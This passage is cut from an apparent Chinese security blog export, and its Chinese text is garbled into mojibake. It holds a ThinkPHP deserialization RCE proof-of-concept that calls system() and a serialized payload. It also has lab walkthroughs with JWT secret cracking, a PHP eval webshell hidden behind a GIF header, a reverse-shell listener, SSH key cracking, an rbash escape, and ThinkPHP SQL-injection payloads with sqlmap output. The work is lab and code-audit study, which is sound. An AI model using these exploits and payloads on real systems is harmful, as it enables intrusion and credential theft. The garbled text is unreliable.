ç„¶åè®¿é—®æ³¨å…¥è¿›å»TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtzOjQ1OiJFOlxwaHBzdHVkeV9wcm9cV1dXXFRoaW5rUEhQLXY1LjEuMjlcZmxhZy50eHQiO319 è·¯å¾„å°±æ˜¯åŸºæœ¬çš„index.phpindexindex é»˜è®¤è·¯å¾„ å…è®¸åç›´æ¥åˆ é™¤äº†æ–‡ä»¶ æ¡ˆä¾‹äºŒ-ååºåˆ—åŒ–é“¾RCEæ‰§è¡Œ ThinkPHP 5.05.1 ç‰ˆæœ¬çš„å†å²é—ç•™é—®é¢˜ï¼Œå®˜æ–¹åœ¨åç»­ç‰ˆæœ¬ä¸­é€æ­¥ä¿®å¤ é“¾æ¡ Attribute.php:480, think\\model\\Pivot-getValue() Attribute.php:457, think\\model\\Pivot-getAttr() Conversion.php:173, think\\model\\Pivot-toArray() Conversion.php:252, think\\model\\Pivot-toJson() Conversion.php:268, think\\model\\Pivot-__toString() Windows.php:163, file_exists() Windows.php:163, think\\process\\pipes\\Windows-removeFiles() Windows.php:59, think\\process\\pipes\\Windows-__destruct() å…ˆæ˜¯åˆ°äº†file_existsç„¶åæ‰¾tostringæ‰¾åˆ°visibleå› ä¸ºå®ƒæ˜¯ä¸å­˜åœ¨çš„æ‰€ä»¥è°ƒç”¨__callç„¶åæ‰¾isAjaxä½¿ç”¨return call_user_func_array($this-hook[$method], $args);æ¥è°ƒç”¨jsAjaxè¿™æ‰æ˜¯ä¸‹é¢ä»£ç è°ƒç”¨è¿™ä¸ªå‡½æ•°åŸå› å¾€ä¸‹æ‰¾åˆ°call_user_funcå¯ä»¥ç›´æ¥æ‰§è¡ŒRCE ï¼Œcall_user_func_arrayä¸è¡Œæ˜¯å› ä¸ºæœ‰array_unshift($args, $this);ç›¸å½“äºå¾€å‰é¢åŠ äº†ä¸€è¡Œå˜äº† æ‰€ä»¥callæ˜¯è·³æ¿æ‰¾åˆ°äº†isAjax __destruct-removeFiles-file_exists-__toString-toJson-toArray-visible-__call-isAjax-param-input-filterValue-call_user_func POC?php//__call-isAjax-param-input-filterValue-call_user_funcnamespace think;class Request protected $hook = []; protected $filter; protected $mergeParam = true; protected $param = [calc];//protected $param = calcä¹Ÿå¯ä»¥ï¼Œèµ°å¦ä¸€æ¡æ‰§è¡Œè·¯å¾„ protected $config = [ var_ajax = , ]; function __construct() $this-hook=[visible=[$this,isAjax]]; $this-filter=[system]; //__toString-toJson-toArray-visible-namespace think;abstract class Model protected $append = []; private $data=[]; function __construct() $this-append=[star=[]]; $this-data=[star=new Request()]; //ä¸ºåç»­é›†æˆç±»åŠ è½½namespace think\\model;use think\\Model;class Pivot extends Model//__destruct-removeFiles-file_exists-namespace think\\process\\pipes;use think\\model\\Pivot;class Pipesclass Windows extends Pipes private $files = []; function __construct() $this-files=[new Pivot()]; echo base64_encode(serialize(new Windows())); è§£æä¸‹ Windows-__destruct() â†’ removeFiles() â†’ file_exists(Pivot) â†“ Pivot-__toString() â†’ toJson() â†’ toArray() â†“ å¤„ç†$append=[star=[]] â†’ è°ƒç”¨Request-visible([]) â†“ Request-__call() â†’ è½¬å‘åˆ°isAjax() â†“ isAjax() â†’ param() â†’ input([calc]) â†’ filterValue() â†“ call_user_func(system, calc) â†’ å‘½ä»¤æ‰§è¡Œ","tags":["php"]},{"title":"Logié¶æœº-maze-JWT-Ti15ä¸­å›½é˜ŸåŠ æ²¹ï¼","path":"/2025/10/01/posts/ame/","content":"Maze-Logié¶æœº-ä½œè€…ï¼šæˆ‘-QQç¾¤660930334 è¿™é‡Œå¼•ç”¨ä¸‹ç¾¤å‹å¤œä½¬çš„ä»–å†™çš„å¤ªå¥½äº†ï¼Œè‡ªå·±çš„è®¾è®¡æ€è·¯å°±æ˜¯JWTï¼Œä½†æ˜¯æˆ‘æ˜¯ä½œè€…æ‰€ä»¥æ²¡ä»€ä¹ˆæ‰“çš„ç‚¹è®²è§£ï¼Œåªæ˜¯æƒ³è‡´æ•¬ä¸‹æš‘å‡çœ‹çš„ä¸‰ä½“2çš„ä¸»è§’ç½—è¾‘ï¼Œæˆ‘å°†å‘ä¸‹ä¸€ä¸ªç½‘ç»œå®‰å…¨ç‚¹å‘èµ·åæ ‡ï¼æœ€åä¸€å¥AmeåŠ æ²¹ï¼ŒFyåŠ æ²¹ï¼Œè€å°†ä¸æ­»ï¼ŒTi15å¤§å®¶åœ¨ä¸Šæµ·å¹²å›æ¥ï¼ ä¿¡æ¯æ”¶é›† é¦–å…ˆæŸ¥çœ‹ Web æœåŠ¡çš„ä¸»é¡µå†…å®¹ï¼šâ”Œâ”€â”€(kaliã‰¿kali)-[/mnt/hgfs/gx/x] â””â”€$ curl 192.168.205.235 | sed /style/,/\\/style/d ... h1TI15 ä¸­å›½é˜ŸåŠ æ²¹/h1 div class=sloganMake Chinese DOTA Great Again/div div class=slogannever give up è®°ä½è¿™ä¸ªè¦è€ƒ/div ... !--ame:jiayouachunyu-- ç”¨å¯†ç ç™»å½•user.php ç„¶åä½¿ç”¨JWTä»¤ç‰Œçˆ†ç ´æ˜¯å¯†ç nevergiveupä¿®æ”¹åè®¿é—®åˆ°ç•Œé¢ â”Œâ”€â”€(kaliã‰¿kali)-[/mnt/hgfs/gx/x] â””â”€$ vim hash â”Œâ”€â”€(kaliã‰¿kali)-[/mnt/hgfs/gx/x] â””â”€$ cat hash eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJtb2JhbiIsImlhdCI6MTc1O... â”Œâ”€â”€(kaliã‰¿kali)-[/mnt/hgfs/gx/x] â””â”€$ john --wordlist=/usr/share/wordlists/rockyou.txt hash ... nevergiveup (?) æˆåŠŸç ´è§£å¯†é’¥ï¼šnevergiveupè¿™ä¸ªå¯†é’¥æ­£å¥½ä¸é¦–é¡µæç¤ºnever give up è®°ä½è¿™ä¸ªè¦è€ƒç›¸å‘¼åº” è¿›å» æˆåŠŸè¿›å…¥ç®¡ç†é¢æ¿ï¼Œé¡µé¢æç¤ºå­˜åœ¨éšè—æ–‡ä»¶ï¼škarsakarsa369.phpé¡µé¢è¿”å›æç¤ºfuzzï¼Œè¯´æ˜éœ€è¦å¯¹å‚æ•°è¿›è¡Œæ¨¡ç³Šæµ‹è¯•ã€‚ä½¿ç”¨ ffuf å¯¹ PHP å‡½æ•°å‚æ•°è¿›è¡Œçˆ†ç ´ï¼šâ”Œâ”€â”€(kaliã‰¿kali)-[/mnt/hgfs/gx/x] â””â”€$ ffuf -u http://192.168.205.235/karsakarsa369.php?FUZZ=phpinfo(); -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --fs 4 ... cmd [Status: 200, Size: 86168, Words: 4281, Lines: 1024, Duration: 4ms] [WARN] Caught keyboard interrupt (Ctrl-C)å‘ç°å‚æ•° cmd å¯ä»¥æ‰§è¡Œ PHP ä»£ç ã€‚æµ‹è¯•è®¿é—® http://192.168.205.235/karsakarsa369.php?cmd=phpinfo(); ç¡®è®¤å¯ä»¥æ‰§è¡Œ PHP å‡½æ•°ï¼Œä» phpinfo è¾“å‡ºçœ‹åˆ°é»˜è®¤çš„ disable_functions è®¾ç½®ï¼Œä½† exec å‡½æ•°æ˜¯å¯ç”¨çš„ åå¼¹shell â”Œâ”€â”€(kaliã‰¿kali)-[/mnt/hgfs/gx/x] â””â”€$ nc -lvnp 8888 listening on [any] 8888 ... connect to [192.168.205.128] from (UNKNOWN) [192.168.205.235] 50220 id uid=33(www-data) gid=33(www-data) groups=33(www-data shellç¯å¢ƒä¼˜åŒ– script /dev/null -c bash Ctrl+Z stty raw -echo; fg reset xterm export TERM=xterm export SHELL=/bin/bash stty rows 36 columns 178 å‘ç°å¯†ç  www-data@logi:/var$ ls backups/ alternatives.tar.0 apt.extended_states.1.gz apt.extended_states.3.gz apt.extended_states.5.gz dpkg.statoverride.0 group.bak shadow.bak apt.extended_states.0 apt.extended_states.2.gz apt.extended_states.4.gz dpkg.diversions.0 dpkg.status.0 passwd gshadow.bak passwd.bak www-data@logi:/var$ cd backups/ www-data@logi:/var/backups$ cat passwd xiangwozheyangderen åˆ‡æ¢ææƒ å‘ç° ame ç”¨æˆ·å¯ä»¥æ— å¯†ç æ‰§è¡Œ /usr/bin/wall å‘½ä»¤è¿™é‡Œéœ€è¦äº†è§£ä¸€äº›æœ‰è¶£çš„æŠ€æœ¯ç»†èŠ‚ã€‚å¦‚æœä½ ç°åœ¨çš„ shell æ˜¯ www-dataï¼ˆåå¼¹ï¼‰ï¼Œç„¶å su ame çš„ shellï¼Œæ‰§è¡Œ sudo wall --nobanner /root/.ssh/id_rsa ä¼šæ²¡æœ‰ä»»ä½•è¾“å‡ºã€‚è¿™æ˜¯å› ä¸ºï¼šwall å¹¶ä¸ä¼šç›´æ¥æŠŠå†…å®¹è¾“å‡ºç»™å½“å‰æ‰§è¡Œè€…ï¼Œå®ƒçš„å·¥ä½œæµç¨‹æ˜¯ï¼š1. æ‰“å¼€ /var/run/utmp æ–‡ä»¶ï¼›2. éå†å…¶ä¸­è®°å½•çš„ç™»å½•ç”¨æˆ·ï¼ˆæ¯”å¦‚ 3. å¯¹æ¯ä¸ªç”¨æˆ·å¯¹åº”çš„ who ,wå‘½ä»¤èƒ½çœ‹åˆ°çš„ï¼‰ï¼›/dev/pts/X å†™å…¥å¹¿æ’­æ¶ˆæ¯ç°åœ¨æˆ‘ä»¬é‡åˆ°çš„é—®é¢˜æ˜¯ï¼šame@logi:~$ tty /dev/pts/0 tty æˆ‘ä»¬æ˜¯æœ‰çš„ï¼Œé—®é¢˜æ˜¯ç™»å½•è®°å½•ï¼šame@logi:~$ who ame@logi:~$ w 07:42:06 up 3:06, 0 users, load average: 0.00, 0.00, 0.00 USER TTY FROM æˆ‘ä»¬æ˜¯åå¼¹çš„ä¼ªç»ˆç«¯ï¼Œä¸æ˜¯ç™»å½•ä¼šè¯ï¼ŒLOGIN@ IDLE JCPU utmp é‡Œæ²¡æœ‰å®ƒçš„æ¡ç›®ï¼ŒPCPU WHAT wall è‡ªç„¶ä¸ä¼šå‘æ¶ˆæ¯åˆ°å®ƒã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦ SSH é‡æ–°è¿æ¥ ameã€‚ è¯»å–ç§é’¥ç™»å½• ame@logi:~$ cat tmp | sed s/\\s\\+$//; s/\\$//g id_rsa ame@logi:~$ chmod 600 id_rsa root@logi:~# cat /root/provemyself.txt /home/ame/user.txt rootxiangrootzheyangderen user:niudexiongdiniude","tags":["JWT"]},{"title":"MVC-PHPä»£ç å®¡è®¡4-æ¡†æ¶-SQLæ³¨å…¥","path":"/2025/10/01/posts/code6phpmvc/","content":"MVC-PHPä»£ç å®¡è®¡4-æ¡†æ¶-SQLæ³¨å…¥ åˆ¤æ–­æ˜¯å¦æ˜¯æ¡†æ¶ï¼š\tæœç´¢version THINK_VERSION\tåˆ¤æ–­è¯­æ³•\tçœ‹æ–‡ä»¶å æ¡ˆä¾‹ä¸€schoolcms-sqlæ³¨å…¥-ç‰ˆæœ¬æ¼æ´æ–°å»ºéœ€è¦è‡ªå·±çœ‹æƒ…å†µè‡ªå·±æ–°å»ºè¦å†™å…¥çš„ç›®å½•æˆ‘è¿™é‡Œæ˜¯RuntimeCache åˆ›å»ºäº†å°±è¿›å»äº† admin schoolcms é»˜è®¤å¯†ç  ç‚¹å‡»å³è¾¹æ–‡ç« å‘ç°äº† http://localhost:910/index.php?m=Homec=Articlea=Indexid=6 public function Index() $m = M(Article); $article = $m-where(array(id=I(id), is_enable=1))-find(); if(!empty($article[content])) // è®¿é—®ç»Ÿè®¡ $m-where(array(id=I(id)))-setInc(access_count);Mè¡¨ç¤ºè¡¨åå­—ç”¨äº†é»˜è®¤çš„find()æ–¹æ³• const THINK_VERSION = 3.2.3; ç‰ˆæœ¬å¦‚ä¸‹ åœ¨è¿™ä¸ªç‰ˆæœ¬findæ˜¯æœ‰sqlæ³¨å…¥æ¼æ´çš„ id[table]user%20where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)â€“id[where]1 ç»“æœä¸è¡Œ ApplicationAdminControllerAdminController.class.php æˆ‘ä»¬æ¢ä¸€ä¸ªæ–‡ä»¶è¿™é‡Œçš„ä»£ç æµ‹è¯• public function SaveInfo()\t// ç™»å½•æ ¡éªŒ\t$this-Is_Login();\t// ä¸æ˜¯æ“ä½œè‡ªå·±çš„æƒ…å†µä¸‹\tif(I(id) != $this-admin[id]) // æƒé™æ ¡éªŒ $this-Is_Power(); // ç”¨æˆ·ç¼–è¾‘\t$id = I(id);\tif($id 0) http://localhost:910/index.php?m=adminc=Articlea=SaveInfoid=6 å› ä¸ºæ˜¯æ•°å­—ä¸ç”¨å¼•å· http://localhost:910/index.php?m=adminc=Articlea=SaveInfoid[where]=6 and sleep(2)# ä¸ç”¨æŠ¥é”™å› ä¸ºæ²¡å¼€ ç¡®å®å»¶è¿Ÿäº† ä½¿ç”¨sqlmapè·‘ GET /index.php?m=adminc=Articlea=SaveInfoid[where]=1* HTTP/1.1Host: 192.168.1.56:910Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9Cookie: think_language=en-US; PHPSESSID=36ijnbi7on3o87iu9t7nt9bd9tpython sqlmap.py -r 1234.txterun with the --tamper=betweenURI parameter #1* is vulnerable. Do you want to keep testing the others (if any)? [y/N]sqlmap identified the following injection point(s) with a total of 393 HTTP(s) requests:---Parameter: #1* (URI) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: http://192.168.1.56:910/index.php?m=adminc=Articlea=SaveInfoid[where]=1 AND 3941=3941 Type: stacked queries Title: MySQL = 5.0.12 stacked queries (comment) Payload: http://192.168.1.56:910/index.php?m=adminc=Articlea=SaveInfoid[where]=1;SELECT SLEEP(5)# Type: time-based blind Title: MySQL = 5.0.12 AND time-based blind (query SLEEP) Payload: http://192.168.1.56:910/index.php?m=adminc=Articlea=SaveInfoid[where]=1 AND (SELECT 2987 FROM (SELECT(SLEEP(5)))YRrr)---[10:40:20] [INFO] the back-end DBMS is MySQLweb application technology: ThinkPHP, Apache 2.4.39back-end DBMS: MySQL = 5.0.12[10:40:21] [INFO] fetched data logged to text files under C:\\Users\\22118\\AppData\\Local\\sqlmap\\output\\192.168.1.56[10:40:21] [WARNING] your sqlmap version is outdated æ¡ˆä¾‹äºŒ-weipan-åå°ä¸å®‰å…¨çš„sqlè¯­æ³•å†™æ³•indexcontrollerGoods.php http://localhost:912/index/Goods/ajaxkdata/tokenpid/1 and 11 where(â€˜pidâ€™.$pid (â€˜uidâ€™,$uid)-find() $user = Db::name(userinfo)-where(uid,$uid)-find(); è¿™ç§æ˜¯é¢„ç¼–è¯‘å†™æ³•ä½¿ç”¨,æ¥è¿æ¥ä½†æ˜¯åœ¨ä»–åŒä¸€æ–‡ä»¶å‘ç°äº†.æ¥è¿æ¥è¿™å¯èƒ½æ˜¯ä¸€ä¸ªæ¼æ´public function ajaxkdata() //è·å–kçº¿å›¾æ•°æ®ï¼Œè½¬åŒ–ä¸ºarray $pid = input(param.pid); $data = Db::name(productdata)-where(pid=.$pid)-find(); $newdata = array(); if($data) $data[UpdateTime] = $data[UpdateTime]; $newdata[0][price] = $data[Price]; $newdata[0][open] = $data[Open]; $newdata[0][close] = $data[Close]; $newdata[0][lowest] = $data[Low]; $newdata[0][highest] = $data[High]; $newdata[0][time] = $data[UpdateTime].000; $newdata[0][fulltime] = date(Y-m-d H:i:s,$data[UpdateTime]); $newdata[0][goodtime] = date(Y-m-d H:i:s,$data[UpdateTime]); è¿™é‡Œç‰ˆæœ¬ä¹Ÿæœ‰pharæ¼æ´ ä»–ç‰ˆæœ¬æ˜¯5.0.24 .phpggc ThinkPHPFW1 ç›®æ ‡ç›®å½• æœ¬åœ°æ–‡ä»¶ -p phar -o test.phar indexgetdatamkdirs?dirphar:test.png THINKPHP-mysqlçˆ†ç ´å¯¼è‡´å¯†ç æ³„éœ²-5.0.24åœ¨è¿™ä¸ªæºç ç‰ˆæœ¬ä¸­å½“å¯¹é¢mysqlå¤–è¿ ä¸”å¼€å¯æŠ¥é”™æ—¶å€™å¯ä»¥çˆ†ç ´æ¥çœ‹åˆ°å¯†ç  åŸå› æ˜¯thinphpé‡Œé¢æœ‰ä¸€ä¸ªè¿æ¥æ–‡ä»¶ ä¸€ç›´è¿æ¥æŠ¥é”™ä¼šçˆ†å‡ºå¼‚å¸¸ ä¿®å¤å…³é—­debug æ³¨é‡Šæ‰è¿æ¥æ–‡ä»¶ä»£ç ","tags":["php"]},{"title":"readfileé¶æœº-maze-snmp-rbash-èƒ½åŠ›æœºåˆ¶","path":"/2025/09/28/posts/readfile/","content":"Maze-readfileé¶æœº-ä½œè€…ï¼š-QQç¾¤660930334 ä¿¡æ¯æ”¶é›†NMAPæ‰«æç«¯å£ TCP è¿™é‡Œå‘ç°ä¸€ä¸ª80æˆ‘ä»¬è®¿é—®å‘ç°æ˜¯ä¸€ä¸ªflatpressçš„åšå®¢ç•Œé¢ ä»–æœ‰ä¸€ä¸ªç›®å½•éå†çš„æ¼æ´ â”Œâ”€â”€(rootã‰¿kali)-[/linepas]â””â”€# nmap 172.20.10.3 -p- Starting Nmap 7.92 ( https://nmap.org ) at 2025-09-28 00:29 EDTNmap scan report for wordpress.local (172.20.10.3)Host is up (0.00030s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open httpMAC Address: 08:00:27:BE:6E:41 (Oracle VirtualBox virtual NIC) è¿™ä¸ªåšå®¢æœ‰ä¸€ä¸ªç›®å½•éå†æ¼æ´æˆ‘çœ‹ä½œè€…æç¤ºå«æˆ‘ä»¬ç¿»æ–‡ä»¶æˆ‘å°±å»ç¿»å‘—ç¿»åˆ°å¯†ç å°±æ‹¿ä¸‹webshelläº† åˆ°ç½‘ä¸Šæ‰¾åˆ°äº†ä»–çš„ç³»ç»Ÿæ¶æ„flatpress/â”œâ”€â”€ admin/â”œâ”€â”€ docs/â”œâ”€â”€ fp-content/â”œâ”€â”€ fp-defaults/â”œâ”€â”€ fp-includes/â”œâ”€â”€ fp-interface/â”œâ”€â”€ fp-plugins/â”œâ”€â”€ setup/â”œâ”€â”€ .gitignoreâ”œâ”€â”€ CHANGELOG.mdâ”œâ”€â”€ CONTRIBUTORS.mdâ”œâ”€â”€ LICENSE.mdâ”œâ”€â”€ README.mdâ”œâ”€â”€ SECURITY.mdâ”œâ”€â”€ admin.phpâ”œâ”€â”€ blog.phpâ”œâ”€â”€ comments.phpâ”œâ”€â”€ contact.phpâ”œâ”€â”€ defaults.phpâ”œâ”€â”€ get.phpâ”œâ”€â”€ index.phpâ”œâ”€â”€ login.phpâ”œâ”€â”€ rss.phpâ”œâ”€â”€ search.phpâ”œâ”€â”€ setup.phpâ”œâ”€â”€ sitemap.phpâ””â”€â”€ static.php ç»“æœå•¥éƒ½æ²¡æœ‰å‘ç° ä¸€èˆ¬è¿™ä¸ªæ—¶å€™å°±æ˜¯ä¿¡æ¯æ”¶é›†ä¸å¯¹äº† ä¸€èˆ¬æˆ‘UDPæ‰«æå‰100ä¸ª ä½†æ˜¯å°±æ˜¯è¿™ä¸ªå‡ºç°äº†é—®é¢˜ å¯ä»¥å‘ç°å‡ºç°äº†snmp ç®€å•ç½‘ç»œç®¡ç†åè®® Not shown: 198 closed udp ports (port-unreach)PORT STATE SERVICE68/udp open|filtered dhcpc161/udp open snmpMAC Address: 08:00:27:BE:6E:41 (Oracle VirtualBox virtual NIC) è¿™ä¸ªåè®®äº¤äº’éœ€è¦ä¸€ä¸ªç±»ä¼¼å¯†é’¥é€šè¿‡è½¯ä»¶æ¥çˆ†ç ´ å‘ç°å¯†é’¥hello â””â”€# onesixtyone -c /usr/share/john/password.lst 172.20.10.3 -w 64 Scanning 1 hosts, 3656 communities172.20.10.3 [hello] Linux readfile 5.15.0-156-generic #166-Ubuntu SMP Sat Aug 9 00:02:46 UTC 2025 x86_64 ç„¶åæˆ‘ä»¬æ¥ç¿»æ–‡ä»¶ ç¿»åˆ°äº†å¯†ç  .1.3.6.1.4.1.8072.1.3.2 è¿™ä¸ª OID å¹¶ä¸å±äºæ ‡å‡†çš„å…¬å…± MIBï¼ˆç®¡ç†ä¿¡æ¯åº“ï¼‰ï¼Œè€Œæ˜¯å±äº IANAï¼ˆäº’è”ç½‘å·ç åˆ†é…å±€ï¼‰ç»´æŠ¤çš„ â€œç§æœ‰å®éªŒæ€§ MIBâ€ èŒƒå›´ snmpwalk -v2c -c hello 172.20.10.3 å‘ç°æ²¡ä»€ä¹ˆâ”€# snmpwalk -v2c -c hello -On 172.20.10.3 .1.3.6.1.4.1.8072.1.3.2.1.3.6.1.4.1.8072.1.3.2.1.0 = INTEGER: 1.1.3.6.1.4.1.8072.1.3.2.2.1.2.13.112.97.115.115.119.111.114.100.95.108.101.97.107 = STRING: /bin/bash.1.3.6.1.4.1.8072.1.3.2.2.1.3.13.112.97.115.115.119.111.114.100.95.108.101.97.107 = STRING: /usr/local/bin/get_password_info.sh.1.3.6.1.4.1.8072.1.3.2.2.1.4.13.112.97.115.115.119.111.114.100.95.108.101.97.107 = .1.3.6.1.4.1.8072.1.3.2.2.1.5.13.112.97.115.115.119.111.114.100.95.108.101.97.107 = INTEGER: 5.1.3.6.1.4.1.8072.1.3.2.2.1.6.13.112.97.115.115.119.111.114.100.95.108.101.97.107 = INTEGER: 1.1.3.6.1.4.1.8072.1.3.2.2.1.7.13.112.97.115.115.119.111.114.100.95.108.101.97.107 = INTEGER: 1.1.3.6.1.4.1.8072.1.3.2.2.1.20.13.112.97.115.115.119.111.114.100.95.108.101.97.107 = INTEGER: 4.1.3.6.1.4.1.8072.1.3.2.2.1.21.13.112.97.115.115.119.111.114.100.95.108.101.97.107 = INTEGER: 1.1.3.6.1.4.1.8072.1.3.2.3.1.1.13.112.97.115.115.119.111.114.100.95.108.101.97.107 = STRING: Please change your old password mini:hereismyP@ssword!.1.3.6.1.4.1.8072.1.3.2.3.1.2.13.112.97.115.115.119.111.114.100.95.108.101.97.107 = STRING: Please change your old password mini:hereismyP@ssword!.1.3.6.1.4.1.8072.1.3.2.3.1.3.13.112.97.115.115.119.111.114.100.95.108.101.97.107 = INTEGER: 1.1.3.6.1.4.1.8072.1.3.2.3.1.4.13.112.97.115.115.119.111.114.100.95.108.101.97.107 = INTEGER: 0.1.3.6.1.4.1.8072.1.3.2.4.1.2.13.112.97.115.115.119.111.114.100.95.108.101.97.107.1 = STRING: Please change your old password mini:hereismyP@ssword! ç™»å½•è¿›å»ä¸Šä¼ æ–‡ä»¶ è¿™é‡Œå¤´åŠ ä¸€ä¸ªgifå¤´å¯ä»¥ç»•è¿‡ GIF89a;?phpeval($_POST[pass]);ç„¶åç”¨å“¥æ–¯æ‹‰è¿æ¥ æ‹¿åˆ°ç”¨æˆ·shellè¿›å»å‘ç°æ‰§è¡Œä¸äº†å‘½ä»¤ä½†æ˜¯æˆ‘ä»¬å¯ä»¥è¯»å–æ–‡ä»¶ currentDir:/var/www/html/fp-content/attachs/fileRoot:[/]currentUser:www-dataosInfo:Linux readfile 5.15.0-156-generic #166-Ubuntu SMP Sat Aug 9 00:02:46 UTC 2025 x86_64/var/www/html/fp-content/attachs/ NULL/var/www/html/fp-content/attachs/ lsnone of proc_open/passthru/shell_exec/exec/exec/popen/COM/runshellshock/pcntl_exec is available/var/www/html/fp-content/attachs/ å‘ç°ç”¨æˆ·minié‡Œé¢æœ‰.sshæ–‡ä»¶å¹¶ä¸”è¿˜æœ‰auxxæ–‡ä»¶æˆ‘ä»¬å¯ä»¥ç›´æ¥ç™»å½•ä¸‹è½½æ–‡ä»¶åˆ°æœ¬åœ°å¹¶ä¸”sshå¯†é’¥çˆ†ç ´ â””â”€# chmod 600 /root/id_rsa â”Œâ”€â”€(rootã‰¿kali)-[~/generate_by_username]â””â”€# ssh mini@172.20.10.3 -i /root/id_rsaEnter passphrase for key /root/id_rsa: å‘ç°è¦å¯†ç æˆ‘ä»¬å†ssh2johnçˆ†ç ´â”€# ssh2john /root/id_rsa /root/id_rsa:$sshng$6$16$6cf6117d7ba0438249294d07880575a7$1910$6f70656e7373682d6b65792d7631000000000a6165733235362d6374720000000662637279707400000018000000106cf6117d7ba0438249294d07880575a7000000100000000100000197000000077373682d727361000000030100010000018100cc2cfb1756296a5f58406eb987bb4cbeafa8af7e589792a7e57a30b483ad6c5caea9e175da9757f9e7811xxxxxxx å†ç”¨john â””â”€# john --wordlist=/usr/share/wordlists/rockyou.txt john.txtUsing default input encoding: UTF-8Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashesCost 2 (iteration count) is 16 for all loaded hashesWill run 2 OpenMP threadsPress q or Ctrl-C to abort, almost any other key for statusilovehim (/root/id_rsa) ç™»å½•ç”¨æˆ·æ‹¿åˆ°user ssh mini@172.20.10.3 -i /root/id_rsaè¾“å…¥å¯†ç ilovehimNew release 24.04.3 LTS available.Run do-release-upgrade to upgrade to it.Last login: Sat Sep 27 09:25:25 2025 from 172.20.10.11mini@readfile:~$ ææƒè¿™é‡Œè¯´äº†è¿›å…¥åˆ°äº†rbashé‡Œé¢ ç¦æ­¢åˆ‡æ¢ç›®å½•ï¼šä¸èƒ½ä½¿ç”¨cdå‘½ä»¤ï¼Œä¹Ÿæ— æ³•é€šè¿‡PATHæˆ–ç¯å¢ƒå˜é‡åˆ‡æ¢åˆ°å…¶ä»–ç›®å½•ã€‚ç¦æ­¢ä¿®æ”¹ç¯å¢ƒå˜é‡ï¼šPATHã€HOMEç­‰ç¯å¢ƒå˜é‡è¢«å›ºå®šï¼Œæ— æ³•é€šè¿‡exportç­‰å‘½ä»¤ä¿®æ”¹ã€‚ç¦æ­¢æ‰§è¡Œå¤–éƒ¨å‘½ä»¤ï¼šåªèƒ½è¿è¡ŒPATHä¸­æŒ‡å®šç›®å½•çš„å‘½ä»¤ï¼Œä¸”ä¸èƒ½ä½¿ç”¨ç»å¯¹è·¯å¾„ï¼ˆå¦‚/bin/lsï¼‰æˆ–ç›¸å¯¹è·¯å¾„ï¼ˆå¦‚./script.shï¼‰æ‰§è¡Œç¨‹åºã€‚ç¦æ­¢é‡å®šå‘å’Œç®¡é“ï¼šæ— æ³•ä½¿ç”¨ã€ã€ç­‰é‡å®šå‘ç¬¦å·ï¼Œä¹Ÿä¸èƒ½ä½¿ç”¨|ç®¡é“ç¬¦ã€‚ç¦æ­¢ä½¿ç”¨æŸäº› bash ç‰¹æ€§ï¼šå¦‚åˆ«åï¼ˆaliasï¼‰å®šä¹‰ã€å‡½æ•°å®šä¹‰ã€èƒŒæ™¯æ‰§è¡Œï¼ˆï¼‰ã€å‘½ä»¤æ›¿æ¢ï¼ˆ$(...)ï¼‰ç­‰ã€‚ mini@readfile:~$ cat lo-rbash: /dev/null: restricted: cannot redirect outputbash_completion: _upvars: `-a2: invalid number specifier-rbash: /dev/null: restricted: cannot redirect outputbash_completion: _upvars: `-a0: invalid number specifier è·³å‡ºrbashè¾“å…¥å‘½ä»¤ cmini@readfile:~$ bash -p -iDebian-snmp:x:114:120::/var/lib/snmp:/bin/falsemini@readfile:~$ mini@readfile:~$ bash -p -imini@readfile:~$ whoamiminimini@readfile:~$ lslocal.txtmini@readfile:~$ cd /mini@readfile:/$ pwd/mini@readfile:/$ ä½ è·³å‡ºrbashçš„æ ¸å¿ƒæ“ä½œæ˜¯bash -iâ€”â€” é€šè¿‡å¯åŠ¨ä¸€ä¸ªæ–°çš„äº¤äº’å¼ bash shellï¼Œç»•è¿‡äº†åŸrbashçš„å—é™ç¯å¢ƒã€‚è¿™æœ¬è´¨ä¸Šæ˜¯ç›®æ ‡ç³»ç»Ÿrbashé…ç½®ä¸ä¸¥æ ¼å¯¼è‡´çš„ï¼Œå…è®¸ç”¨æˆ·ç›´æ¥è°ƒç”¨æœªå—é™çš„bashç¨‹åº ç”¨ææƒè½¯ä»¶æ¥æ‰«æ å‘ç°ä¸€ä¸ªusrbinpython3.10 cap_dac_overrideep è¿™é‡Œæ ‡çº¢äº† Linux èƒ½åŠ›æœºåˆ¶å°† root ç”¨æˆ·çš„è¶…çº§æƒé™æ‹†åˆ†ä¸ºä¸€ç³»åˆ—ç‹¬ç«‹çš„ â€œèƒ½åŠ›â€ï¼Œè¿›ç¨‹å¯ä»¥åªæ‹¥æœ‰å®Œæˆä»»åŠ¡æ‰€éœ€çš„ç‰¹å®šèƒ½åŠ›ï¼Œè€Œæ— éœ€æ‹¥æœ‰å®Œæ•´çš„ root æƒé™ã€‚ä¾‹å¦‚ï¼šCAP_DAC_OVERRIDEï¼šç»•è¿‡æ–‡ä»¶çš„ discretionary access control (DAC) æ£€æŸ¥ï¼ˆç®€å•è¯´ï¼Œå°±æ˜¯å¯ä»¥è¯»å†™ / 